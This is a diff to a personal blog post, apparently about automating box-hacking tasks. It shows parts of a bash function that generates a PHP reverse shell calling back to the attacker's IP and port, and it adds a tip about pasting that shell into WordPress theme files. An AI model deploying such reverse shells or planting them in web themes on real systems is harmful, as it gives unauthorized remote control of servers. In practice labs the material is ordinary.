@@ -13,6 +13,7 @@ tags:
 
 This post will be updated once in a blue moon. Just wanted to share some of my stuff which I use as I think it's good to automate certain repeated processes when hacking boxes. Life's too short to be wasting time on such things.
 
+---
 
 ## PHP Reverse Shell Generator
 
@@ -27,7 +28,6 @@ Usage: `phprev <Interface> <Optional: Listening Port>`
 
 
 ~~~bash
-
 # Create PHP reverse shell in current directory. Usage example: phprev tun0 1234
 # Defaults to port 443 if port is not specified
 
@@ -45,10 +45,15 @@ function phprev() {
             echo "PHP reverse shell(rev.php) created and configured to connect back to:" $revip:$revport
         fi
 }
-
-
-
 ~~~
+
+If you need to copy and paste the script somewhere(e.g wordpress theme files), just use the following to have the contents copied to your clipboard quickly:
+
+~~~bash
+cat rev.php | xclip -sel clip
+~~~
+
+---
 
 [1]: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 [2]: https://github.com/Dreamscent/Try-Harder/blob/master/Scripts/Shells/php-reverse-shell.php
